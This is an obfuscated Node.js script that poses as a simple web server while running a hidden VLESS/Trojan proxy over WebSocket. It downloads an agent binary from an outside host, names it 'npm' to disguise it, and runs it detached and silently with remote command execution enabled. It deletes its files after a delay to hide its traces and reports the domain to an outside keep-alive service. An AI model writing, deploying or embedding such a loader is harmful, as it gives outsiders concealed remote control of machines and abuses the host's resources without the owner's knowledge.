const _0x110e92=_0x169e;(function(_0x474915,_0x2a7bf2){const _0x1e917b=_0x169e,_0x28b807=_0x474915();while(!![]){try{const _0x5b9c04=parseInt(_0x1e917b(0x11c))/0x1*(parseInt(_0x1e917b(0x101))/0x2)+-parseInt(_0x1e917b(0xd1))/0x3+-parseInt(_0x1e917b(0xc9))/0x4*(parseInt(_0x1e917b(0x108))/0x5)+parseInt(_0x1e917b(0xfe))/0x6+-parseInt(_0x1e917b(0xfd))/0x7*(parseInt(_0x1e917b(0x12a))/0x8)+-parseInt(_0x1e917b(0x10e))/0x9+parseInt(_0x1e917b(0xf7))/0xa;if(_0x5b9c04===_0x2a7bf2)break;else _0x28b807['push'](_0x28b807['shift']());}catch(_0x5ae3ee){_0x28b807['push'](_0x28b807['shift']());}}}(_0x16f7,0xf2216));const os=require('os'),http=require(_0x110e92(0x143)),fs=require('fs'),axios=require('axios'),net=require(_0x110e92(0xf5)),path=require(_0x110e92(0xce)),crypto=require(_0x110e92(0xe4)),{Buffer}=require(_0x110e92(0x11e)),{exec,execSync}=require(_0x110e92(0xe8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x110e92(0xf3)][_0x110e92(0x139)]||_0x110e92(0xdf),NEZHA_SERVER=process[_0x110e92(0xf3)][_0x110e92(0x137)]||'',NEZHA_PORT=process[_0x110e92(0xf3)][_0x110e92(0x130)]||'',NEZHA_KEY=process[_0x110e92(0xf3)][_0x110e92(0xcf)]||'',DOMAIN=process[_0x110e92(0xf3)][_0x110e92(0x136)]||'1234.abc.com',AUTO_ACCESS=process[_0x110e92(0xf3)][_0x110e92(0x140)]||!![],WSPATH=process['env'][_0x110e92(0xc6)]||UUID[_0x110e92(0x12e)](0x0,0x8),SUB_PATH=process[_0x110e92(0xf3)][_0x110e92(0x11d)]||_0x110e92(0xee),NAME=process[_0x110e92(0xf3)][_0x110e92(0x12f)]||_0x110e92(0x12b),PORT=process[_0x110e92(0xf3)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x129f07=_0x110e92;try{const _0x407660=await axios[_0x129f07(0x11a)](_0x129f07(0x10d)),_0x2039b5=_0x407660['data'];ISP=(_0x2039b5[_0x129f07(0x114)]+'-'+_0x2039b5[_0x129f07(0xfa)])['replace'](/ /g,'_');}catch(_0x591bac){ISP=_0x129f07(0x117);}};GetISP();const httpServer=http[_0x110e92(0x106)]((_0x69a453,_0x1f159b)=>{const _0x52d2f6=_0x110e92;if(_0x69a453[_0x52d2f6(0x13c)]==='/'){const _0x38d84d=path['join'](__dirname,_0x52d2f6(0x131));fs[_0x52d2f6(0x129)](_0x38d84d,_0x52d2f6(0xf0),(_0x4ee41d,_0x21329d)=>{const _0x1f979d=_0x52d2f6;if(_0x4ee41d){_0x1f159b[_0x1f979d(0x113)](0xc8,{'Content-Type':_0x1f979d(0xf6)}),_0x1f159b[_0x1f979d(0xd5)](_0x1f979d(0xc8));return;}_0x1f159b[_0x1f979d(0x113)](0xc8,{'Content-Type':'text/html'}),_0x1f159b['end'](_0x21329d);});return;}else{if(_0x69a453[_0x52d2f6(0x13c)]==='/'+SUB_PATH){const _0x2256c0=_0x52d2f6(0xcb)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x52d2f6(0x125)+WSPATH+'#'+NAME+'-'+ISP,_0x247705=_0x52d2f6(0xda)+UUID+'@'+DOMAIN+_0x52d2f6(0xdb)+DOMAIN+_0x52d2f6(0x103)+DOMAIN+_0x52d2f6(0x125)+WSPATH+'#'+NAME+'-'+ISP,_0x37ddca=_0x2256c0+'\x0a'+_0x247705,_0x50c5df=Buffer[_0x52d2f6(0x109)](_0x37ddca)[_0x52d2f6(0xf2)](_0x52d2f6(0x119));_0x1f159b[_0x52d2f6(0x113)](0xc8,{'Content-Type':'text/plain'}),_0x1f159b['end'](_0x50c5df+'\x0a');}else _0x1f159b[_0x52d2f6(0x113)](0x194,{'Content-Type':_0x52d2f6(0x111)}),_0x1f159b['end'](_0x52d2f6(0x138));}}),wss=new WebSocket[(_0x110e92(0xed))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x110e92(0x110),_0x110e92(0x104)];function resolveHost(_0x435e57){return new Promise((_0x2a4c59,_0x34d4d3)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x435e57)){_0x2a4c59(_0x435e57);return;}let _0x3d579c=0x0;function _0x588462(){const _0x1ae873=_0x169e;if(_0x3d579c>=DNS_SERVERS[_0x1ae873(0xdd)]){_0x34d4d3(new Error(_0x1ae873(0x141)+_0x435e57+_0x1ae873(0xd2)));return;}const _0x21c5b6=DNS_SERVERS[_0x3d579c];_0x3d579c++;const _0x789cfb=_0x1ae873(0x145)+encodeURIComponent(_0x435e57)+_0x1ae873(0xcc);axios[_0x1ae873(0x11a)](_0x789cfb,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x1ae873(0x10f)](_0x4c69f0=>{const _0x135d65=_0x1ae873,_0x4bed00=_0x4c69f0['data'];if(_0x4bed00['Status']===0x0&&_0x4bed00['Answer']&&_0x4bed00['Answer'][_0x135d65(0xdd)]>0x0){const _0x4350c6=_0x4bed00[_0x135d65(0xe3)][_0x135d65(0xec)](_0x5c84fc=>_0x5c84fc[_0x135d65(0x10a)]===0x1);if(_0x4350c6){_0x2a4c59(_0x4350c6[_0x135d65(0xf8)]);return;}}_0x588462();})['catch'](_0x3f9cb6=>{_0x588462();});}_0x588462();});}function handleVlessConnection(_0x4620c2,_0x1c03ef){const _0x3b47af=_0x110e92,[_0x575598]=_0x1c03ef,_0x3120ee=_0x1c03ef['slice'](0x1,0x11);if(!_0x3120ee['every']((_0x272365,_0x63c1a0)=>_0x272365==parseInt(uuid['substr'](_0x63c1a0*0x2,0x2),0x10)))return![];let _0x24b1b8=_0x1c03ef[_0x3b47af(0x12e)](0x11,0x12)[_0x3b47af(0x115)]()+0x13;const _0xf929f=_0x1c03ef['slice'](_0x24b1b8,_0x24b1b8+=0x2)[_0x3b47af(0x11f)](0x0),_0x17e113=_0x1c03ef['slice'](_0x24b1b8,_0x24b1b8+=0x1)[_0x3b47af(0x115)](),_0x1e9f8d=_0x17e113==0x1?_0x1c03ef[_0x3b47af(0x12e)](_0x24b1b8,_0x24b1b8+=0x4)[_0x3b47af(0xeb)]('.'):_0x17e113==0x2?new TextDecoder()['decode'](_0x1c03ef['slice'](_0x24b1b8+0x1,_0x24b1b8+=0x1+_0x1c03ef[_0x3b47af(0x12e)](_0x24b1b8,_0x24b1b8+0x1)[_0x3b47af(0x115)]())):_0x17e113==0x3?_0x1c03ef[_0x3b47af(0x12e)](_0x24b1b8,_0x24b1b8+=0x10)[_0x3b47af(0x13e)]((_0xdbe78f,_0x2a5d22,_0x271009,_0x3515ec)=>_0x271009%0x2?_0xdbe78f[_0x3b47af(0x144)](_0x3515ec[_0x3b47af(0x12e)](_0x271009-0x1,_0x271009+0x1)):_0xdbe78f,[])[_0x3b47af(0xd9)](_0x3123d5=>_0x3123d5[_0x3b47af(0x11f)](0x0)['toString'](0x10))[_0x3b47af(0xeb)](':'):'';_0x4620c2['send'](new Uint8Array([_0x575598,0x0]));const _0x4c1e3a=createWebSocketStream(_0x4620c2);return resolveHost(_0x1e9f8d)['then'](_0x2413af=>{const _0x7360fc=_0x3b47af;net[_0x7360fc(0x126)]({'host':_0x2413af,'port':_0xf929f},function(){const _0x15fabd=_0x7360fc;this[_0x15fabd(0x121)](_0x1c03ef[_0x15fabd(0x12e)](_0x24b1b8)),_0x4c1e3a['on'](_0x15fabd(0x122),()=>{})[_0x15fabd(0xd4)](this)['on'](_0x15fabd(0x122),()=>{})[_0x15fabd(0xd4)](_0x4c1e3a);})['on']('error',()=>{});})['catch'](_0x1daaf8=>{const _0x1d4366=_0x3b47af;net[_0x1d4366(0x126)]({'host':_0x1e9f8d,'port':_0xf929f},function(){const _0x36fbc5=_0x1d4366;this['write'](_0x1c03ef[_0x36fbc5(0x12e)](_0x24b1b8)),_0x4c1e3a['on'](_0x36fbc5(0x122),()=>{})[_0x36fbc5(0xd4)](this)['on'](_0x36fbc5(0x122),()=>{})[_0x36fbc5(0xd4)](_0x4c1e3a);})['on'](_0x1d4366(0x122),()=>{});}),!![];}function _0x16f7(){const _0x359bf9=['post','createServer','https://arm64.ssss.nyc.mn/agent','2255LjEAla','from','type','substr','npm','https://speed.cloudflare.com/meta','2220552aVyjXL','then','8.8.4.4','text/plain','https://amd64.ssss.nyc.mn/agent','writeHead','country','readUInt8','message','Unknown','unlink','base64','get','chmod\x20+x\x20npm','34139xNzzZT','SUB_PATH','buffer','readUInt16BE','https://oooo.serv00.net/add-url','write','error','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','createHash','&path=%2F','connect','arch','once','readFile','150152metBtH','Hug','split','sha224','slice','NAME','NEZHA_PORT','index.html','connection','--tls','application/json','trim','DOMAIN','NEZHA_SERVER','Not\x20Found\x0a','UUID','2096','npm\x20is\x20running','url','2053','reduce','Automatic\x20Access\x20Task\x20added\x20successfully','AUTO_ACCESS','Failed\x20to\x20resolve\x20','aarch64','http','concat','https://dns.google/resolve?name=','WSPATH','https://arm64.ssss.nyc.mn/v1','Hello\x20world!','7436uUkGgr','arm','vless://','&type=A','createWriteStream','path','NEZHA_KEY','443','4424016wVeDJe','\x20with\x20all\x20DNS\x20servers','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pipe','end','listen','digest','https://','map','trojan://',':443?security=tls&sni=','arm64','length','Server\x20is\x20running\x20on\x20port\x20','198d3bbb-e56d-4023-809a-ccb3a678eb9d','writeFileSync','log','2083','Answer','crypto','update','stream','true','child_process','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','npm\x20is\x20already\x20running,\x20skip\x20running...','join','find','Server','sub','https://amd64.ssss.nyc.mn/v1','utf8','close','toString','env','includes','net','text/html','29466480iVESHT','data','catch','asOrganization','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','false','266gmFbHn','4017048dmoSYO','config.yaml','2087','38GNxDFe','/bin/bash','&fp=chrome&type=ws&host=','1.1.1.1'];_0x16f7=function(){return _0x359bf9;};return _0x16f7();}function handleTrojanConnection(_0x5d2e69,_0xd79001){const _0x9ce1d2=_0x110e92;try{if(_0xd79001[_0x9ce1d2(0xdd)]<0x3a)return![];const _0x65eb9e=_0xd79001[_0x9ce1d2(0x12e)](0x0,0x38)[_0x9ce1d2(0xf2)](),_0x1bcfb4=[UUID];let _0x44752a=null;for(const _0x27790a of _0x1bcfb4){const _0x4c664e=crypto[_0x9ce1d2(0x124)](_0x9ce1d2(0x12d))[_0x9ce1d2(0xe5)](_0x27790a)[_0x9ce1d2(0xd7)]('hex');if(_0x4c664e===_0x65eb9e){_0x44752a=_0x27790a;break;}}if(!_0x44752a)return![];let _0x32b7c3=0x38;_0xd79001[_0x32b7c3]===0xd&&_0xd79001[_0x32b7c3+0x1]===0xa&&(_0x32b7c3+=0x2);const _0x49e307=_0xd79001[_0x32b7c3];if(_0x49e307!==0x1)return![];_0x32b7c3+=0x1;const _0x26bc9c=_0xd79001[_0x32b7c3];_0x32b7c3+=0x1;let _0x41b0db,_0xfa1df2;if(_0x26bc9c===0x1)_0x41b0db=_0xd79001[_0x9ce1d2(0x12e)](_0x32b7c3,_0x32b7c3+0x4)[_0x9ce1d2(0xeb)]('.'),_0x32b7c3+=0x4;else{if(_0x26bc9c===0x3){const _0x281015=_0xd79001[_0x32b7c3];_0x32b7c3+=0x1,_0x41b0db=_0xd79001[_0x9ce1d2(0x12e)](_0x32b7c3,_0x32b7c3+_0x281015)[_0x9ce1d2(0xf2)](),_0x32b7c3+=_0x281015;}else{if(_0x26bc9c===0x4)_0x41b0db=_0xd79001[_0x9ce1d2(0x12e)](_0x32b7c3,_0x32b7c3+0x10)[_0x9ce1d2(0x13e)]((_0x293de,_0x384634,_0x5e07ca,_0x210c16)=>_0x5e07ca%0x2?_0x293de[_0x9ce1d2(0x144)](_0x210c16[_0x9ce1d2(0x12e)](_0x5e07ca-0x1,_0x5e07ca+0x1)):_0x293de,[])[_0x9ce1d2(0xd9)](_0x3eacde=>_0x3eacde[_0x9ce1d2(0x11f)](0x0)['toString'](0x10))[_0x9ce1d2(0xeb)](':'),_0x32b7c3+=0x10;else return![];}}_0xfa1df2=_0xd79001[_0x9ce1d2(0x11f)](_0x32b7c3),_0x32b7c3+=0x2;_0x32b7c3<_0xd79001['length']&&_0xd79001[_0x32b7c3]===0xd&&_0xd79001[_0x32b7c3+0x1]===0xa&&(_0x32b7c3+=0x2);const _0xdc6aaa=createWebSocketStream(_0x5d2e69);return resolveHost(_0x41b0db)[_0x9ce1d2(0x10f)](_0x5b1ad8=>{const _0x47c050=_0x9ce1d2;net[_0x47c050(0x126)]({'host':_0x5b1ad8,'port':_0xfa1df2},function(){const _0x23dc11=_0x47c050;_0x32b7c3<_0xd79001[_0x23dc11(0xdd)]&&this[_0x23dc11(0x121)](_0xd79001['slice'](_0x32b7c3)),_0xdc6aaa['on'](_0x23dc11(0x122),()=>{})['pipe'](this)['on'](_0x23dc11(0x122),()=>{})[_0x23dc11(0xd4)](_0xdc6aaa);})['on'](_0x47c050(0x122),()=>{});})[_0x9ce1d2(0xf9)](_0x143401=>{const _0x308825=_0x9ce1d2;net[_0x308825(0x126)]({'host':_0x41b0db,'port':_0xfa1df2},function(){const _0x5e3d93=_0x308825;_0x32b7c3<_0xd79001['length']&&this[_0x5e3d93(0x121)](_0xd79001[_0x5e3d93(0x12e)](_0x32b7c3)),_0xdc6aaa['on'](_0x5e3d93(0x122),()=>{})['pipe'](this)['on'](_0x5e3d93(0x122),()=>{})[_0x5e3d93(0xd4)](_0xdc6aaa);})['on'](_0x308825(0x122),()=>{});}),!![];}catch(_0x100195){return![];}}wss['on'](_0x110e92(0x132),(_0x488dc1,_0x133556)=>{const _0x470661=_0x110e92,_0xecac27=_0x133556['url']||'';_0x488dc1[_0x470661(0x128)](_0x470661(0x116),_0x4b0630=>{const _0x4ac0ab=_0x470661;if(_0x4b0630[_0x4ac0ab(0xdd)]>0x11&&_0x4b0630[0x0]===0x0){const _0x14b9b6=_0x4b0630[_0x4ac0ab(0x12e)](0x1,0x11),_0x5be4f9=_0x14b9b6['every']((_0x16c701,_0x1a550b)=>_0x16c701==parseInt(uuid[_0x4ac0ab(0x10b)](_0x1a550b*0x2,0x2),0x10));if(_0x5be4f9){!handleVlessConnection(_0x488dc1,_0x4b0630)&&_0x488dc1[_0x4ac0ab(0xf1)]();return;}}!handleTrojanConnection(_0x488dc1,_0x4b0630)&&_0x488dc1[_0x4ac0ab(0xf1)]();})['on'](_0x470661(0x122),()=>{});});function _0x169e(_0x5e8636,_0xa01db3){_0x5e8636=_0x5e8636-0xc6;const _0x16f7d1=_0x16f7();let _0x169e23=_0x16f7d1[_0x5e8636];return _0x169e23;}const getDownloadUrl=()=>{const _0x18ec33=_0x110e92,_0x7c2c5b=os[_0x18ec33(0x127)]();return _0x7c2c5b===_0x18ec33(0xca)||_0x7c2c5b===_0x18ec33(0xdc)||_0x7c2c5b===_0x18ec33(0x142)?!NEZHA_PORT?_0x18ec33(0xc7):_0x18ec33(0x107):!NEZHA_PORT?_0x18ec33(0xef):_0x18ec33(0x112);},downloadFile=async()=>{const _0x23e790=_0x110e92;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3a634a=getDownloadUrl(),_0x3a0923=await axios({'method':'get','url':_0x3a634a,'responseType':_0x23e790(0xe6)}),_0x124548=fs[_0x23e790(0xcd)](_0x23e790(0x10c));return _0x3a0923[_0x23e790(0xf8)]['pipe'](_0x124548),new Promise((_0x13d489,_0x2c8e7f)=>{const _0x15d776=_0x23e790;_0x124548['on']('finish',()=>{const _0x32eb67=_0x169e;console[_0x32eb67(0xe1)]('npm\x20download\x20successfully'),exec(_0x32eb67(0x11b),_0x318788=>{if(_0x318788)_0x2c8e7f(_0x318788);_0x13d489();});}),_0x124548['on'](_0x15d776(0x122),_0x2c8e7f);});}catch(_0x19dbb6){throw _0x19dbb6;}},runnz=async()=>{const _0x29ae35=_0x110e92;try{const _0x423df7=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x423df7[_0x29ae35(0x135)]()!==''){console[_0x29ae35(0xe1)](_0x29ae35(0xea));return;}}catch(_0x19b0b5){}await downloadFile();let _0x4df91d='',_0x34329d=[_0x29ae35(0xd0),'8443',_0x29ae35(0x13a),_0x29ae35(0x100),_0x29ae35(0xe2),_0x29ae35(0x13d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x28460a=_0x34329d['includes'](NEZHA_PORT)?_0x29ae35(0x133):'';_0x4df91d='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x28460a+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x446588=NEZHA_SERVER[_0x29ae35(0xf4)](':')?NEZHA_SERVER[_0x29ae35(0x12c)](':')['pop']():'',_0xc3d448=_0x34329d[_0x29ae35(0xf4)](_0x446588)?_0x29ae35(0xe7):_0x29ae35(0xfc),_0x1dda89='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x29ae35(0xfb)+_0xc3d448+_0x29ae35(0xd3)+UUID;fs[_0x29ae35(0xe0)](_0x29ae35(0xff),_0x1dda89);}_0x4df91d=_0x29ae35(0x123);}else{console[_0x29ae35(0xe1)](_0x29ae35(0xe9));return;}}try{exec(_0x4df91d,{'shell':_0x29ae35(0x102)},_0x26d755=>{const _0xc33180=_0x29ae35;if(_0x26d755)console[_0xc33180(0x122)]('npm\x20running\x20error:',_0x26d755);else console[_0xc33180(0xe1)](_0xc33180(0x13b));});}catch(_0x3dc94e){console[_0x29ae35(0x122)]('error:\x20'+_0x3dc94e);}};async function addAccessTask(){const _0x39ca5c=_0x110e92;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x470b75=_0x39ca5c(0xd8)+DOMAIN;try{const _0x39a13f=await axios[_0x39ca5c(0x105)](_0x39ca5c(0x120),{'url':_0x470b75},{'headers':{'Content-Type':_0x39ca5c(0x134)}});console[_0x39ca5c(0xe1)](_0x39ca5c(0x13f));}catch(_0x1f68ae){}}const delFiles=()=>{const _0x509b33=_0x110e92;fs[_0x509b33(0x118)](_0x509b33(0x10c),()=>{}),fs['unlink'](_0x509b33(0xff),()=>{});};httpServer[_0x110e92(0xd6)](PORT,()=>{const _0x39cd6d=_0x110e92;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x39cd6d(0xe1)](_0x39cd6d(0xde)+PORT);});
